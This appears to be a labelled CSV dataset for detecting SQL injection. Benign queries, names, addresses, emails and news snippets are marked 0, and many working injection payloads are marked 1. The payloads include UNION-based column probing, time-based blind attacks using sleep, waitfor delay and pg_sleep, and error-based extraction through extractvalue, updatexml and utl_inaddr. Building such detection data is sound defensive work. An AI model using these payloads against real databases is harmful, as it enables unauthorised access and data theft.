Query,Label
SELECT * FROM worried WHERE badly = 'week' FETCH FIRST 3 ROWS ONLY,0
korey_molina@juguetespersonales.gob,0
agenor,0
siripong,0
campion@transportesvegasl.cat,0
"-8893 )  union all select 7594,7594,7594,7594,7594,7594#",1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,1
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ),0
"pl. san marcos, 0, 11f",0
6e665a,0
sabu35so,0
villanueva del fresno,0
ana,0
stavro,0
tacita,0
"SELECT * FROM process WHERE factor NOT IN  ( 'wait', 'therefore', 'example' )",0
1 where 9620 = 9620 waitfor delay '0:0:5'--,1
1175,0
pampa,0
"1   )    )     )   union all select null,null,null,null--",1
"&quot; Frontier also following Spirit &apos;s $ 2 charge coffee , tea , soda , juice",0
chunshin,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( ""%"" = """,1
"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",1
"1'  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  'fele' = 'fele",1
SELECT diagram FROM service UNION SELECT independent FROM desert ORDER BY furniture,0
cabral_crowther@frioelectric.br,0
""" or ""a"" = ""a",1
"1 )  where 9149 = 9149 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT * FROM affect WHERE dirt = 'camp'  OR yellow = 'salmon',0
mudie,0
"c/ geranio, 65",0
1'  )   as pwqs where 2291  =  2291,1
select  ( case when  ( 5847 = 2826 )  then 5847 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )",1
"SELECT longer, rocky, sweet FROM metal WHERE someone  IS NULL",0
leroy-beaulieu.rizzo7@softwaresaas.cl,0
1' )  as bihs where 4197 = 4197,1
"1"" or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""regi"" like ""regi",1
SELECT * FROM sea FETCH FIRST 3 ROWS ONLY,0
"' union  ( select NULL,  ( select @@version  )  )   --",1
SELECT AVG ( musical ) FROM dead SELECT SUM ( road ),0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ),1
116,0
1'   )    )    as myws where 5274  =  5274,1
"US-Mexico drug tunnel railway found One sophisticated drug smuggling tunnels USA Mexico found , complete lighting , ventilation electric rail systems",0
ossie,0
"SELECT * FROM five ORDER BY limited, off",0
The budget &quot; L-Missions &quot; lies around one billion Euro,0
"But agreeing take official oath court , rather parliament customary , bowing military &apos;s indication contest power continue",0
"dos aceras 119,",0
SELECT or FROM mud,0
"-3609""   )    )    as fzyp where 9474  =  9474 or 9323  =  9323#",1
SELECT COUNT ( that )  FROM wealth,0
01632755p,0
"SELECT * FROM thy WHERE stems BETWEEN ""suit"" AND    ""breath""",0
crichton,0
SELECT nation FROM rising UNION ALL SELECT freedom FROM pool ORDER BY dirt,0
SELECT TOP 50 PERCENT * FROM information,0
1' where 6003 = 6003 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --,1
SELECT * FROM wide WHERE upward NOT LIKE '[deep]%',0
canella,0
lebrillo,0
"SELECT bat, inch, biggerFROM opinion WHERE show  IS NOT NULL",0
"-8833'  )  )   union all select 3227,3227,3227,3227,3227--",1
1'  )  )   )  and  ( 1685 = 2985 ) *2985 and   (  (   ( 'rzwb' = 'rzwb,1
stockbridge@softstylestudio.mk,0
3527140000000000,0
1 )  where 2734 = 2734 waitfor delay '0:0:5'--,1
"1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  '",1
gavin@apagado.com.pk,0
declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1
santibez de bjar,0
"c/ juan luis peralta, 49 13-f",0
But next creation set even ambitious,0
descapotar,0
stefana1,0
ronaldso,0
"c/ luarca, 151, 7?g",0
"Renamo wanted &quot; warn international community things going well Mozambique , &quot; Mr Mazanga said",0
35is117r,0
SELECT COUNT ( highestID ) FROM cry,0
coe,0
"The improvements reported joint model compared pipeline model Chinese richly inflected languages, shows also makes sense jointly perform punctuation prediction parsing, although two tasks POS tagging punctuation prediction different two ways: 1)",0
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'wgpg' like 'wgpg",1
"&quot; Double Down &quot; claims Daley spearheaded effort replace Biden , despite &quot; close personal rapport , &quot; ultimately deciding move data showed adding Clinton ticket &apos;t &quot; materially improve Obama &apos;s odds",0
08806627l,0
llorador,0
"Instead , believes dogs learned experience moves &apos;t feel worried",0
"1',iif ( 4861 = 6268,1,1/0 )",1
SELECT COUNT ( beginningID ) FROM were,0
adrin,0
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1
1693717556836495,0
"grupo santa teresa 155,",0
andries,0
nys,0
94845655a,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( 'pshn' like 'pshn",1
beecher@mailboxrussia.gu,0
SELECT * FROM teach FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLY,0
"-3326'+ ( select xitp where 7621 = 7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",1
46844,0
1'   )    )    as qpai where 2619  =  2619,1
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga",1
"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1
doron@beljos.ch,0
"INSERT INTO quarter  ( plan, taken, country )  VALUES  ( 'tiny', 'needed', 'clock' )",0
c5fra98,0
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",1
"&quot; There neurosurgeons Cameroon , &quot; Georges Bwelle said",0
4341,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( ""cwat"" like ""cwat",1
"The Public Prosecutor accused stabbed beaten three men car Finowfurt , together unknown accomplices",0
"UPDATE hat SET fuel =  'meat', City =  'differ' WHERE signal =  root",0
alfeo,0
"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1
clint,0
castellanos de castro,0
SELECT * FROM forth WHERE Price NOT BETWEEN 10 AND 20,0
"SELECT entirely, bare+ ', ' + ten+ ' ' + title+ ', ' + shirt AS evening  FROM planning",0
"Derided Brotherhood &apos;s uncharismatic &quot; spare tyre , &quot; personal prestige surged since victory delivery Friday speech tried present candidate Islamists want complete work 2011 uprising authoritarian Mubarak",0
"1"" )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
-7726 or 3038  =  3038,1
6659103638292546,0
quill,0
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0
"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
7013,0
But Mr Chen appeared state television admitting published false stories money,0
drought,0
"In evening , fans brass band music treat",0
SELECT * FROM including WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM Customers  WHERE CustomerName LIKE '%or%',0
genet,0
"1"" )  where 2834 = 2834  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
su6sc87u23r,0
"1""  )  )   and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""bfko"" = ""bfko",1
"-6987' union all select 4721,4721--",1
macrina,0
bielat,0
rocco-misaki@soybueno.nz,0
dejillo,0
SELECT * FROM six WHERE needs = 'pleasant'  AND City = 'breathe',0
"sequera de haza, la",0
"Lucky us , &quot; baby pumpkin trend &quot; started last year thanks Pinterest , us grew carving gourds sitting",0
"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",1
1' )  where 3588 = 3588,1
sanet y negrals,0
SELECT TOP 3 * FROM against SELECT * FROM game 3SELECT * FROM popular,0
roze,0
isalenia,0
21208,0
"-4807' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'wwki' = 'wwki",1
SELECT * FROM saved WHERE satellites = 'evening' FETCH FIRST 3 ROWS ONLY,0
la,0
SELECT habit ( s )  FROM condition LEFT JOIN,0
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",1
1110922192224003,0
"SELECT Employees.knowledge, COUNT ( Orders.lifeID )  AS potatoesFROM    ( OrdersINNER JOIN carbon ON Orders.crowdID  =  Employees.sweetID )",0
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
8781173513237509,0
1' where 7613 = 7613,1
patterso,0
SELECT * FROM mice WHERE wrong = 'offer' FETCH FIRST 3 ROWS ONLY,0
"SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID",0
"-4095' )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
SELECT chain ( s )  FROM prize,0
7870029061793911,0
It also case town centre citizens particular mobile must also able access post box Sunday collection foot,0
v,1
DELETE FROM frighten WHERE ordinary = 'fine',0
or '7659'  =  '7659,1
The Commander expressed satisfaction following exercise,0
3195370000000000,0
tsoucas,0
7an8o15a,0
"1' )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( 'cfzp' like 'cfzp",1
FROM  ( SELECT DISTINCT species FROM identity ),0
"SELECT DATE_ADD ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",0
SELECT * FROM palace WHERE answer = 'caught' FETCH FIRST 3 ROWS ONLY,0
zaquiel,0
1  )   where 6424  =  6424,1
"SELECT breadID AS ID, ahead AS feed FROM unhappy",0
"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1
c/ grabador david roberts 154 1-h,0
"1%""  )  )   and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  ""%"" = """,1
"1"" )  where 2445 = 2445",1
lewes,0
"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",1
1%'  )  )   )  union all select null#,1
"c/ peiscola, 95 3?g",0
"-1823 where 6852 = 6852 union all select 6852,6852,6852,6852,6852,6852#",1
1'||  (  select 'sliy' where 9494  =  9494,1
adelaide,0
"1%""  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  ""%"" = """,1
23456317c,0
tripicallero,0
calle pintor el greco 102 1-g,0
nowack@softwaresaas.bm,0
SELECT * FROM circus WHERE Price NOT BETWEEN 10 AND 20,0
SELECT AVG ( quickly )  FROM master  SELECT SUM ( vowel ),0
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""jgcv"" = ""jgcv",1
Second place taken Michael Klippel / Sadmin Osmicic partnership,0
SELECT century ( s )  FROM adventure,0
SELECT * FROM live,0
The accused initially remained silent,0
amaja,0
"1, ( select  ( case when  ( 8392 = 8404 )  then 1 else 8392* ( select 8392 from information_schema.character_sets )  end  )  )",1
The lessees also wanted longer terms,0
16537,0
gargajienta,0
SELECT tank ( s )  FROM classroom FULL OUTER JOIN,0
7400290000000000,0
It also says research shows cabin experience depends width seat,0
1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260  =  1260,1
9usta4ui6,0
"In separate move , Ofqual , exams regulator , unveil shake-up structure GCSEs , new grading system less coursework",0
"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",1
leonel,0
"select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
t08a26,0
"calle arriola 29,",0
7118,0
7519305817718575,0
"1'|| ( select 'pzto' from dual where 7338 = 7338 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  )  ||'",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_text' LIMIT 1,0
valderredible,0
lapidificar,0
30599008s,0
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq",1
"1"" )  where 2656 = 2656 or sleep ( 5 ) --",1
SELECT AVG ( map ) FROM forward,0
-2223'  )  )   as mjwp where 8650 = 8650 or 7900 = 5838,1
SELECT * FROM order WHERE naturally = 'winter' LIMIT 3,0
"tebete, s/n, 8?d",0
manzanilla,0
chusma,0
SELECT COUNT ( DISTINCT century )  FROM mouth,0
SELECT * FROM child,0
"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
rubi de biasi,0
11690,0
"I much prefer lower strain, genuine equal, glittering unsteady",0
The waist average 21st-century American male 39,0
SELECT * FROM principal WHERE case = 'poor',0
SELECT * FROM raise WHERE held BETWEEN whose09/01/1996attached AND bag15/31/1996bite,0
group by userid having 1  =  1--,1
"1""   )    )    as chal where 6661  =  6661",1
07947301l,0
ailn,0
SELECT MIN ( higher )  AS bell FROM course,0
rodolfo,0
Roark et al,0
dorice,0
SELECT feature FROM although UNION ALL SELECT clear FROM result ORDER BY habit,0
2ariosamente,0
1'   )    )     )   and 9198  =  9198--,1
"1' )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 'yznd' like 'yznd",1
"-3775' )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
"-8735'   )    )    union all select 3262,3262,3262--",1
"calle blas infante 52, 6-h",0
SELECT * FROM forth WHERE wish BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM labor ORDER BY slide,0
sabanea9,0
"1%'  )   union all select null,null,null,null#",1
39500,0
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""oyou"" = ""oyou",1
rad0oelctrico,0
kaz,0
The bank promptly notified relevant authorities co-operating regulators,0
lidia,0
3090147546194865,0
c/ primavera 81 9?a,0
The prepaid mobiles thrown away afterwards,0
mohandas,0
The crowning glory visit Abendmahlskirche,0
SELECT once ( s )  FROM afraid UNION ALL,0
18505219v,0
bly7,0
5719365905876928,0
50430,0
"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",1
1'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'guxv' = 'guxv,1
1'|| ( select 'tjzy' where 3037 = 3037,1
hews,0
"SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = ""Around the Horn"" AND c.CustomerID = o.CustomerID;",0
71997567t,0
"-5150   )    )     )   union all select 5660,5660,5660#",1
"1'  )  )   as agdn where 8442 = 8442 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1
l1am217r5,0
"&quot; This tax going black hole , &quot; said Adrian Moore , vice president policy Reason",0
"That said , I hope finally start winning",0
"1 )  as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
"SELECT opposite, situation, foot FROM soft WHERE buffalo  IS NULL",0
"INSERT INTO him ( kitchen, waste, triangle, half, pool, shore )  VALUES  ( 'managed', 'name'. living', 'library', 'cell', 'told', 'stems' )",0
